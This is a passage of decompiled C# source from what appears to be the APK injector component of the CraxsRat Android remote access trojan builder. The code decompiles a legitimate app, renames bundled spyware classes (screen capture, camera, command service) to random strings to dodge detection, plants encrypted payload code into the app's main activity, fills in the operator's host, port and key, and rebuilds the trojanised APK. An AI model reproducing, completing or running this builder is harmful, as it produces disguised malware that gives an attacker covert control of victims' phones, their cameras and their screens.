					string contents = File.ReadAllText(path).Replace("RequestPermissions", this.N_RequestPermissions).Replace("RequestAccess", this.N_RequestAccess).Replace("EngineWorkerins", this.N_newEngineWorkerins).Replace("CommandsService", this.N_CommandsService).Replace("StartScreenCap", this.NStartScreenCap).Replace("webviewer", this.N__webviewer_).Replace("RequestCapScreen", this.N__RequestCapScreen_).Replace("CameraActivity", this.N__CameraActivity_).Replace("RequestBattery", this.N_RequestBattery).Replace("HandelScreenCap", this.N_HandelScreenCap).Replace("_METHOD_getbyte_", this.newgetbyts).Replace("_mthd_issrvrun_", this.newsrvrun).Replace("_splet_1_", this.split1).Replace("_split_2_", this.split2).Replace("_split_3_", this.split3).Replace("_the_plugns_", this.newplgs).Replace("_split_4_", this.split4).Replace("_the_host_", this.newhost).Replace(this.Decrypt("fhTUPYsif35OSfhZ0W7kaw==", this.TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.TheKey.Text))).Replace(this.Decrypt("l47cEy4tX1IFMbXx/K/EjQ==", this.TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.Host.Text))).Replace(this.Decrypt("4v6Ulzh5+UOGfKCrVSMVZQ==", this.TK), Convert.ToBase64String(Encoding.UTF8.GetBytes(this.Port.Text))).Replace("USE-SUPER", this.usersper).Replace("USE-DRAWOVER", this.usedraw).Replace("[delayacess]", this.TextSize.Text).Replace("[US-UNINS]", this.useruninstall).Replace("USE-ALLPRIM", this.ASKPRIM_all.ToString()).Replace("fource.info", "false").Replace("name.info", this.CLiname.Text).Replace("_the_port_", this.newport).Replace("_the_key_", this.newkey).Replace("_the_alive_", this.newalive).Replace("_usr_nam_", this.newname).Replace("_the_eco_", this.neweco).Replace("_C_N_L_", this.newcnl).Replace("_c_N_M_", this.newcnm).Replace("_NOTIFI_TITLE_", this.titletext.Text).Replace("_NOTIFI_MSG_", this.msgtext.Text).Replace("_send_mthd_", this.newsndmthd).Replace("_the_fouce_", this.newsndmthd).Replace("_the_fouce_", this.newforuce).Replace("_the_sokt_", this.newsokt).Replace("payload", Conversions.ToString(this.RandomShit(minCharacters, maxCharacters))).Replace("_start_connect_", this.newstrtconct).Replace("_is_connected_", this.newconect).Replace("[RANDOM-STRING]", this.NEWRANDOM).Replace("RequestDraw", this.N_RequestDraw).Replace("WakeupActivity", this.N_WakeupActivity);
					File.WriteAllText(path, contents);
					Thread.Sleep(1);
				}
				string text5 = text4 + "\\effectservicecimpl\\marketpush";
				string searchPattern = "*.smali";
				int num4 = 0;
				string[] files2 = Directory.GetFiles(text5, searchPattern, SearchOption.AllDirectories);
				foreach (string text6 in files2)
				{
					if (text6.Contains("RequestPermissions") | text6.Equals("RequestPermissions"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("RequestPermissions", this.N_RequestPermissions)));
					}
					if (text6.Contains("EngineWorkerins") | text6.Equals("EngineWorkerins"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("EngineWorkerins", this.N_newEngineWorkerins)));
					}
					if (text6.Contains("RequestAccess") | text6.Equals("RequestAccess"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("RequestAccess", this.N_RequestAccess)));
					}
					if (text6.Contains("CommandsService") | text6.Equals("CommandsService"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("CommandsService", this.N_CommandsService)));
					}
					if (text6.Contains("StartScreenCap") | text6.Equals("StartScreenCap"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("StartScreenCap", this.NStartScreenCap)));
					}
					if (text6.Contains("RequestBattery") | text6.Equals("RequestBattery"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("RequestBattery", this.N_RequestBattery)));
					}
					if (text6.Contains("RequestCapScreen") | text6.Equals("RequestCapScreen"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("RequestCapScreen", this.N__RequestCapScreen_)));
					}
					if (text6.Contains("webviewer") | text6.Equals("webviewer"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("webviewer", this.N__webviewer_)));
					}
					if (text6.Contains("CameraActivity") | text6.Equals("CameraActivity"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("CameraActivity", this.N__CameraActivity_)));
					}
					if (text6.Contains("HandelScreenCap") | text6.Equals("HandelScreenCap"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("HandelScreenCap", this.N_HandelScreenCap)));
					}
					if (text6.Contains("WakeupActivity") | text6.Equals("WakeupActivity"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("WakeupActivity", this.N_WakeupActivity)));
					}
					if (text6.Contains("RequestDraw") | text6.Equals("RequestDraw"))
					{
						File.Move(Path.Combine(text5, text6), Path.Combine(text5, text6.Replace("RequestDraw", this.N_RequestDraw)));
					}
					num4++;
					Thread.Sleep(1);
				}
				num4 = 0;
				string[] files3 = Directory.GetFiles(text5, searchPattern, SearchOption.AllDirectories);
				foreach (string text7 in files3)
				{
					if (text7.Contains("ClassGen"))
					{
					}
					num4++;
					Thread.Sleep(1);
				}
			}
			catch (Exception ex7)
			{
				Exception ex8 = ex7;
				this.log.AppendText(Environment.NewLine + "Error : Encryption...\r\n" + ex8.Message);
			}
			this.log.AppendText(Environment.NewLine + "> Injecting Main Activity...");
			int num5 = 0;
			if (!this.CheckAutomatic.Checked)
			{
				string newValue = null;
				using (IEnumerator enumerator2 = this.Activlist.Items.GetEnumerator())
				{
					while (enumerator2.MoveNext())
					{
						object value = enumerator2.Current;
						string text8 = Conversions.ToString(value);
						try
						{
							text8 = text8.Replace(">", this.TheApkPath);
							if (File.Exists(text8))
							{
								string[] array10 = File.ReadAllLines(text8);
								int num6 = array10.Length - 1;
								for (int num7 = 0; num7 <= num6; num7++)
								{
									if (num7 == 0)
									{
										string[] array11 = array10[0].Split(new char[]
										{
											' '
										});
										newValue = array11[array11.Length - 1];
									}
									if (array10[num7].Contains(this.Decrypt("XqgovOgiwNmuEisbFkaXwA==", this.TK)) && array10[num7].ToLower().StartsWith(".method".ToLower()))
									{
										array10[num7 + 1] = array10[num7 + 1] + Environment.NewLine + this.D(Resources.oncreatecode).Replace(this.D("W3RyZ3RtYWluXQ=="), newValue);
										array10[array10.Length - 1] = array10[array10.Length - 1] + Environment.NewLine + Environment.NewLine + this.D(this.Decrypt(Resources.MainMith, this.TK)).Replace(this.D("W3RyZ3RtYWluXQ=="), newValue);
										IL_163D:
										File.WriteAllLines(text8, array10);
										goto IL_1646;
									}
								}
								goto IL_163D;
							}
							IL_1646:;
						}
						catch (Exception)
						{
						}
						num5++;
					}
					goto IL_19EC;
				}
			}
			List<string> activityNames = Codes.GetActivityNames(this.TheApkPath + "\\AndroidManifest.xml", this.checkonlymain.Checked);
			string smaliFolderPath = "smali";
			string newValue2 = null;
			using (List<string>.Enumerator enumerator3 = activityNames.GetEnumerator())
			{
				IL_17F0:
				while (enumerator3.MoveNext())
				{
					string activityName = enumerator3.Current;
					string text9 = Codes.FindActivityInSmali(this.TheApkPath, activityName, smaliFolderPath);
					if (Operators.CompareString(text9, "pass", false) != 0)
					{
						string[] array12 = File.ReadAllLines(text9);
						int num8 = array12.Length - 1;
						for (int num9 = 0; num9 <= num8; num9++)
						{
							if (num9 == 0)
							{
								string[] array13 = array12[0].Split(new char[]
								{
									' '
								});
								newValue2 = array13[array13.Length - 1];
							}
							if (array12[num9].Contains(this.Decrypt("XqgovOgiwNmuEisbFkaXwA==", this.TK)) && array12[num9].ToLower().StartsWith(".method".ToLower()))
							{
								array12[num9 + 1] = array12[num9 + 1] + Environment.NewLine + this.D(Resources.oncreatecode).Replace(this.D("W3RyZ3RtYWluXQ=="), newValue2);
								array12[array12.Length - 1] = array12[array12.Length - 1] + Environment.NewLine + Environment.NewLine + this.D(this.Decrypt(Resources.MainMith, this.TK)).Replace(this.D("W3RyZ3RtYWluXQ=="), newValue2);
								IL_17E7:
								File.WriteAllLines(text9, array12);
								goto IL_17F0;
							}
						}
						goto IL_17E7;
					}
				}
			}
			int num10 = 2;
			string newValue3 = null;
			do
			{
				if (Directory.Exists(this.TheApkPath + "\\smali_classes" + num10.ToString()))
				{
					smaliFolderPath = "smali_classes" + num10.ToString();
					using (List<string>.Enumerator enumerator4 = activityNames.GetEnumerator())
					{
						IL_19A1:
						while (enumerator4.MoveNext())
						{
							string activityName2 = enumerator4.Current;
							string text10 = Codes.FindActivityInSmali(this.TheApkPath, activityName2, smaliFolderPath);
							if (!text10.Equals("pass", StringComparison.CurrentCultureIgnoreCase))
							{
								Console.WriteLine(text10);
								string[] array14 = File.ReadAllLines(text10);
								int num11 = array14.Length - 1;
								for (int num12 = 0; num12 <= num11; num12++)
								{
									if (num12 == 0)
									{
										string[] array15 = array14[0].Split(new char[]
										{
											' '
										});
										newValue3 = array15[array15.Length - 1];
									}
									if (array14[num12].Contains(this.Decrypt("XqgovOgiwNmuEisbFkaXwA==", this.TK)) && array14[num12].ToLower().StartsWith(".method".ToLower()))
									{
										array14[num12 + 1] = array14[num12 + 1] + Environment.NewLine + this.D(Resources.oncreatecode).Replace(this.D("W3RyZ3RtYWluXQ=="), newValue3);
										array14[array14.Length - 1] = array14[array14.Length - 1] + Environment.NewLine + Environment.NewLine + this.D(this.Decrypt(Resources.MainMith, this.TK)).Replace(this.D("W3RyZ3RtYWluXQ=="), newValue3);
										IL_1998:
										File.WriteAllLines(text10, array14);
										goto IL_19A1;
									}
								}
								goto IL_1998;
							}
						}
						goto IL_181B;
					}
					continue;
				}
				IL_181B:
				num10++;
			}
			while (num10 <= 14);
			IL_19EC:
			if (this.CheckAutomatic.Checked)
			{
				this.log.AppendText(Environment.NewLine + "-----------------" + Environment.NewLine + "> Building Apk...");
				string text11 = this.WorkingDir + "\\out";
				this.outputapk = text11 + "\\Ready.apk";
				if (!Directory.Exists(text11))
				{
					Directory.CreateDirectory(text11);
				}
				this.ExecuteCommand(string.Concat(new string[]
				{
					"java -jar ",
					this.apktoolpath,
					" b -f ",
					this.TheApkPath,
					" -o ",
					this.outputapk
				}));
			}
			else
			{
				this.log.AppendText(Environment.NewLine + "-----------------" + Environment.NewLine + "All Done Recompile Apk...");
			}
		}
	}

	// Token: 0x060005FF RID: 1535 RVA: 0x0009DA14 File Offset: 0x0009BC14
	public string Decrypt(string text, string password)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = new byte[32];
		byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(password));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		byte[] array2 = Convert.FromBase64String(text);
		return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
	}

	// Token: 0x06000600 RID: 1536 RVA: 0x0009DA98 File Offset: 0x0009BC98
	public string madladstr()
	{
		return Conversions.ToString(this.RandommMad(100, 150));
	}

	// Token: 0x06000601 RID: 1537 RVA: 0x0009DABC File Offset: 0x0009BCBC
	public object RandommMad(int minCharacters, int maxCharacters)
	{
		string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
		if (this.rshit == null)
		{
			this.rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 += Conversions.ToString(text[this.rshit.Next(0, text.Length - 1)]);
			}
			this.cou3++;
			return text2.ToString().ToLower() + Conversions.ToString(this.cou3);
		}
	}

	// Token: 0x06000602 RID: 1538 RVA: 0x0009DB4C File Offset: 0x0009BD4C
	public object CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq(int minCharacters, int maxCharacters)
	{
		string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
		if (this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init == null)
		{
			Interlocked.CompareExchange<StaticLocalInitFlag>(ref this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init, new StaticLocalInitFlag(), null);
		}
		bool flag = false;
		try
		{
			Monitor.Enter(this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init, ref flag);
			if (this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State == 0)
			{
				this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State = 2;
				this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r = new Random();
			}
			else if (this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init);
			}
		}
		int num = this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r.Next(minCharacters, maxCharacters);
		StringBuilder stringBuilder = new StringBuilder();
		int num2 = num;
		checked
		{
			for (int i = 1; i <= num2; i++)
			{
				int startIndex = this._0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r.Next(0, text.Length);
				stringBuilder.Append(text.Substring(startIndex, 1));
			}
			return stringBuilder.ToString();
		}
	}

	// Token: 0x06000603 RID: 1539 RVA: 0x0009DC54 File Offset: 0x0009BE54
	private bool CheckAllValuse()
	{
		if (this.Host.Text != "" && this.Port.Text != "" && this.TheKey.Text != "")
		{
			if (this.CheckAutomatic.Checked)
			{
				if (this.TargetApktext.Text != "")
				{
					return true;
				}
			}
			else if (this.FolderPath.Text != "" && this.Activlist.Items.Count > 0)
			{
				return true;
			}
		}
		return false;
	}

	// Token: 0x06000604 RID: 1540 RVA: 0x0009DCF8 File Offset: 0x0009BEF8
	private void Port_TextChanged(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(this.Port.Text, "", false) != 0 && !Versioned.IsNumeric(this.Port.Text))
			{
				this.Port.Text = "";
				Interaction.MsgBox("Only Numbers", MsgBoxStyle.OkOnly, null);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000605 RID: 1541 RVA: 0x0009DD68 File Offset: 0x0009BF68
	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			MySettingsProperty.Settings.inj_tnam = this.CLiname.Text;
			MySettingsProperty.Settings.inj_thost = this.Host.Text;
			MySettingsProperty.Settings.inj_tport = this.Port.Text;
			MySettingsProperty.Settings.inj_tkey = this.TheKey.Text;
			MySettingsProperty.Settings.Save();
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000606 RID: 1542 RVA: 0x0009DDE8 File Offset: 0x0009BFE8
	public string UpdateVersions(string inputXml)
	{
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.LoadXml(inputXml);
		XmlNode xmlNode = xmlDocument.SelectSingleNode("/manifest");
		if (xmlNode != null)
		{
			XmlAttribute xmlAttribute = xmlNode.Attributes["compileSdkVersion"];
			XmlAttribute xmlAttribute2 = xmlNode.Attributes["platformBuildVersionCode"];
			int num;
			if (xmlAttribute != null && int.TryParse(xmlAttribute.Value, out num) && num > 29)
			{
				xmlAttribute.Value = "29";
			}
			int num2;
			if (xmlAttribute2 != null && int.TryParse(xmlAttribute2.Value, out num2) && num2 > 29)
			{
				xmlAttribute2.Value = "29";
			}
		}
		return xmlDocument.OuterXml;
	}

	// Token: 0x06000607 RID: 1543 RVA: 0x0009DE98 File Offset: 0x0009C098
	private void Form1_Load(object sender, EventArgs e)
	{
		this.Translateme();
		try
		{
			this.CLiname.Text = MySettingsProperty.Settings.inj_tnam;
			this.Host.Text = MySettingsProperty.Settings.inj_thost;
			this.Port.Text = MySettingsProperty.Settings.inj_tport;
			this.TheKey.Text = MySettingsProperty.Settings.inj_tkey;
		}
		catch (Exception)
		{
			this.CLiname.Text = "Client1";
			this.Host.Text = "...";
			this.Port.Text = "7771";
			this.TheKey.Text = "TxTxT";
		}
	}

	// Token: 0x06000608 RID: 1544 RVA: 0x0000206C File Offset: 0x0000026C
	private void Button4_Click_1(object sender, EventArgs e)
	{
	}

	// Token: 0x06000609 RID: 1545 RVA: 0x00002858 File Offset: 0x00000A58
	private void DrakeUIAvatar1_Click(object sender, EventArgs e)
	{
		base.Close();
	}

	// Token: 0x0600060A RID: 1546
	[DllImport("user32")]
	public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	// Token: 0x0600060B RID: 1547
	[DllImport("user32.dll")]
	public static extern bool ReleaseCapture();

	// Token: 0x0600060C RID: 1548 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUITitlePanel1_MouseDown(object sender, MouseEventArgs e)
	{
	}

	// Token: 0x0600060D RID: 1549 RVA: 0x0009DF54 File Offset: 0x0009C154
	private void DrakeUITitlePanel2_Click(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https:// /");
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x0600060E RID: 1550 RVA: 0x0009DF84 File Offset: 0x0009C184
	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Jector.ReleaseCapture();
			Jector.SendMessage(base.Handle, Jector.WM_NCLBUTTONDOWN, Jector.HT_CAPTION, 0);
		}
	}

	// Token: 0x0600060F RID: 1551 RVA: 0x0009DFC0 File Offset: 0x0009C1C0
	private void Removeactiv_Click(object sender, EventArgs e)
	{
		if (this.Activlist.Items.Count > 0)
		{
			if (this.Activlist.SelectedItem != null)
			{
				this.Activlist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Activlist.SelectedItem));
			}
			else
			{
				EagleAlert.Showinformation("Select Activity First");
			}
		}
		else
		{
			EagleAlert.Showinformation("Activity List: 0");
		}
	}

	// Token: 0x06000610 RID: 1552 RVA: 0x0009E02C File Offset: 0x0009C22C
	private void CheckAutomatic_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.CheckAutomatic.Checked)
		{
			this.paneltargetfolder.Enabled = false;
			this.addactiv.Enabled = false;
			this.removeactiv.Enabled = false;
			this.panelactivitys.Enabled = false;
			this.Label6.Enabled = false;
			this.TargetApktext.Enabled = true;
			this.selectapkbtn.Enabled = true;
			this.labeltargetapp.Enabled = true;
			this.checkonlymain.Enabled = true;
			this.checkprotector.Enabled = true;
		}
		else
		{
			this.panelactivitys.Enabled = true;
			this.paneltargetfolder.Enabled = true;
			this.addactiv.Enabled = true;
			this.removeactiv.Enabled = true;
			this.Label6.Enabled = true;
			this.TargetApktext.Enabled = false;
			this.selectapkbtn.Enabled = false;
			this.labeltargetapp.Enabled = false;
			this.checkonlymain.Enabled = false;
			this.checkprotector.Enabled = false;
		}
	}

	// Token: 0x06000611 RID: 1553 RVA: 0x0009E138 File Offset: 0x0009C338
	private void Selectapkbtn_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.InitialDirectory = "C:\\";
		openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
		openFileDialog.Filter = "apk Files|*.apk";
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			this.TargetApktext.Text = "";
		}
		else
		{
			this.TargetApktext.Text = openFileDialog.FileName;
		}
	}

	// Token: 0x06000612 RID: 1554 RVA: 0x0009E1A0 File Offset: 0x0009C3A0
	private void checksuper_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checksuper.Checked)
		{
			this.usersper = "True";
		}
		else
		{
			this.usersper = "False";
		}
	}

	// Token: 0x06000613 RID: 1555 RVA: 0x0009E1D4 File Offset: 0x0009C3D4
	private void checkDraw_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkDraw.Checked)
		{
			this.usedraw = "True";
		}
		else
		{
			this.usedraw = "False";
		}
	}

	// Token: 0x06000614 RID: 1556 RVA: 0x0009E208 File Offset: 0x0009C408
	private void checkkill_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkkill.Checked)
		{
			this.useruninstall = "on";
		}
		else
		{
			this.useruninstall = "off";
		}
	}

	// Token: 0x0400086B RID: 2155
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	// Token: 0x0400086C RID: 2156
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addactiv")]
	private Button _addactiv;

	// Token: 0x0400086D RID: 2157
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	// Token: 0x0400086E RID: 2158
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checksuper")]
	private CheckBox _checksuper;

	// Token: 0x0400086F RID: 2159
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkkill")]
	private CheckBox _checkkill;

	// Token: 0x04000870 RID: 2160
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUITitlePanel2")]
	private DrakeUITitlePanel _DrakeUITitlePanel2;

	// Token: 0x04000871 RID: 2161
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("removeactiv")]
	private Button _removeactiv;

	// Token: 0x04000872 RID: 2162
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkDraw")]
	private CheckBox _checkDraw;

	// Token: 0x04000873 RID: 2163
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CheckAutomatic")]
	private DrakeUICheckBox _CheckAutomatic;

	// Token: 0x04000874 RID: 2164
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selectapkbtn")]
	private Button _selectapkbtn;

	// Token: 0x04000875 RID: 2165
	private string TheApkPath;

	// Token: 0x04000876 RID: 2166
	private string N_RequestPermissions;

	// Token: 0x04000877 RID: 2167
	private string N_RequestAccess;

	// Token: 0x04000878 RID: 2168
	private string N_newEngineWorkerins;

	// Token: 0x04000879 RID: 2169
	private string N_CommandsService;

	// Token: 0x0400087A RID: 2170
	private string NStartScreenCap;

	// Token: 0x0400087B RID: 2171
	private string N_WakeupActivity;

	// Token: 0x0400087C RID: 2172
	private string N_RequestDraw;

	// Token: 0x0400087D RID: 2173
	private string N_RequestBattery;

	// Token: 0x0400087E RID: 2174
	private string N__CameraActivity_;

	// Token: 0x0400087F RID: 2175
	private string N__RequestCapScreen_;

	// Token: 0x04000880 RID: 2176
	private string N__webviewer_;

	// Token: 0x04000881 RID: 2177
	private string N_HandelScreenCap;

	// Token: 0x04000882 RID: 2178
	private string newgetbyts;

	// Token: 0x04000883 RID: 2179
	private string newsrvrun;

	// Token: 0x04000884 RID: 2180
	private string split1;

	// Token: 0x04000885 RID: 2181
	private string split2;

	// Token: 0x04000886 RID: 2182
	private string split3;

	// Token: 0x04000887 RID: 2183
	private string split4;

	// Token: 0x04000888 RID: 2184
	private string newhost;

	// Token: 0x04000889 RID: 2185
	private string newport;

	// Token: 0x0400088A RID: 2186
	private string newkey;

	// Token: 0x0400088B RID: 2187
	private string newalive;

	// Token: 0x0400088C RID: 2188
	private string newname;

	// Token: 0x0400088D RID: 2189
	private string neweco;

	// Token: 0x0400088E RID: 2190
	private string newconect;

	// Token: 0x0400088F RID: 2191
	private string newsokt;

	// Token: 0x04000890 RID: 2192
	private string newstrtconct;

	// Token: 0x04000891 RID: 2193
	private string newcnl;

	// Token: 0x04000892 RID: 2194
	private string newcnm;

	// Token: 0x04000893 RID: 2195
	private string newsndmthd;

	// Token: 0x04000894 RID: 2196
	private string newforuce;

	// Token: 0x04000895 RID: 2197
	private string newplgs;

	// Token: 0x04000896 RID: 2198
	private string NEWRANDOM;

	// Token: 0x04000897 RID: 2199
	private string usersper;

	// Token: 0x04000898 RID: 2200
	private string usedraw;

	// Token: 0x04000899 RID: 2201
	private string useruninstall;

	// Token: 0x0400089A RID: 2202
	private List<string> ALLPRIMSLIST;

	// Token: 0x0400089B RID: 2203
	private int cou;

	// Token: 0x0400089C RID: 2204
	public string TK;

	// Token: 0x0400089D RID: 2205
	public bool need_write;

	// Token: 0x0400089E RID: 2206
	public bool need_battery;

	// Token: 0x0400089F RID: 2207
	public bool need_read;

	// Token: 0x040008A0 RID: 2208
	public bool need_forground;

	// Token: 0x040008A1 RID: 2209
	public bool need_syswinow;

	// Token: 0x040008A2 RID: 2210
	public bool need_boot;

	// Token: 0x040008A3 RID: 2211
	public bool need_all;

	// Token: 0x040008A4 RID: 2212
	public bool ASKPRIM_all;

	// Token: 0x040008A5 RID: 2213
	public bool Once;

	// Token: 0x040008A6 RID: 2214
	public bool HoldMainThread;

	// Token: 0x040008A7 RID: 2215
	private Process cmdProcess;

	// Token: 0x040008A8 RID: 2216
	public string WorkingDir;

	// Token: 0x040008A9 RID: 2217
	private bool FoundJava;

	// Token: 0x040008AA RID: 2218
	private string apktemp;

	// Token: 0x040008AB RID: 2219
	private string apktoolpath;

	// Token: 0x040008AC RID: 2220
	private string Apksignerpath;

	// Token: 0x040008AD RID: 2221
	private string ApkZIPpath;

	// Token: 0x040008AE RID: 2222
	private string outputapk;

	// Token: 0x040008AF RID: 2223
	private string originalapkname;

	// Token: 0x040008B0 RID: 2224
	private string Apkeditorpath;

	// Token: 0x040008B1 RID: 2225
	private bool protectfinished;

	// Token: 0x040008B2 RID: 2226
	public Random rshit;

	// Token: 0x040008B3 RID: 2227
	public int cou3;

	// Token: 0x040008B4 RID: 2228
	public static int WM_NCLBUTTONDOWN = 161;

	// Token: 0x040008B5 RID: 2229
	public static int HT_CAPTION = 2;

	// Token: 0x040008B6 RID: 2230
	private Random _0024STATIC_0024RandomShit_00242021C88_0024r;

	// Token: 0x040008B7 RID: 2231
	private StaticLocalInitFlag _0024STATIC_0024RandomShit_00242021C88_0024r_0024Init;

	// Token: 0x040008B8 RID: 2232
	private Random _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number;

	// Token: 0x040008B9 RID: 2233
	private StaticLocalInitFlag _0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init;

	// Token: 0x040008BA RID: 2234
	private Random _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r;

	// Token: 0x040008BB RID: 2235
	private StaticLocalInitFlag _0024STATIC_0024CraxsRatkfvuiorkenfudpajrsnCraxsRatsijdraq_00242021C88_0024r_0024Init;

	// Token: 0x02000083 RID: 131
	[CompilerGenerated]
	internal sealed class _Closure_0024__289_002D0
	{
		// Token: 0x0600061D RID: 1565 RVA: 0x0009E2D8 File Offset: 0x0009C4D8
		public _Closure_0024__289_002D0(Jector._Closure_0024__289_002D0 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_msg = arg0._0024VB_0024Local_msg;
			}
		}

		// Token: 0x0600061E RID: 1566 RVA: 0x00003010 File Offset: 0x00001210
		internal void _Lambda_0024__1()
		{
			this._0024VB_0024Me.log.AppendText(Environment.NewLine + this._0024VB_0024Local_msg.Replace("I:", "> "));
		}

		// Token: 0x0600061F RID: 1567 RVA: 0x00003041 File Offset: 0x00001241
		internal void _Lambda_0024__2()
		{
			this._0024VB_0024Me.log.AppendText(Environment.NewLine + this._0024VB_0024Local_msg);
		}

		// Token: 0x06000620 RID: 1568 RVA: 0x00003063 File Offset: 0x00001263
		internal void _Lambda_0024__3()
		{
			this._0024VB_0024Me.log.AppendText(Environment.NewLine + this._0024VB_0024Local_msg.Replace("E:", "ERROR :"));
		}

		// Token: 0x040008F1 RID: 2289
		public string _0024VB_0024Local_msg;

		// Token: 0x040008F2 RID: 2290
		public Jector _0024VB_0024Me;
	}

	// Token: 0x02000084 RID: 132
	[CompilerGenerated]
	internal sealed class _Closure_0024__289_002D1
	{
		// Token: 0x06000621 RID: 1569 RVA: 0x0009E300 File Offset: 0x0009C500
		public _Closure_0024__289_002D1(Jector._Closure_0024__289_002D1 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_ex = arg0._0024VB_0024Local_ex;
			}
		}

		// Token: 0x06000622 RID: 1570 RVA: 0x00003094 File Offset: 0x00001294
		internal void _Lambda_0024__10()
		{
			this._0024VB_0024Me.log.AppendText(Environment.NewLine + "Global Error: " + this._0024VB_0024Local_ex.Message);
		}

		// Token: 0x040008F3 RID: 2291
		public Exception _0024VB_0024Local_ex;

		// Token: 0x040008F4 RID: 2292
		public Jector _0024VB_0024Me;
	}
}
